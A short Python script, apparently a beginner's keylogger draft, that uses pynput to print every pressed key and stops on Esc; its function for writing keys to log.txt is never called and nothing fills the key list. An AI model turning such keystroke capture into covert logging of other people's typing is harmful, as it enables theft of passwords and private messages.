import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def onpress(key):
    print("{0} pressed".format(key))

def writefile():
    with open("log.txt", "a") as f:
        for key in keys:
            f.write(key)

def onrelease(key):
    if key == Key.esc:
        return False



with Listener(on_press=onpress,on_release=onrelease) as listner:
    listner.join()
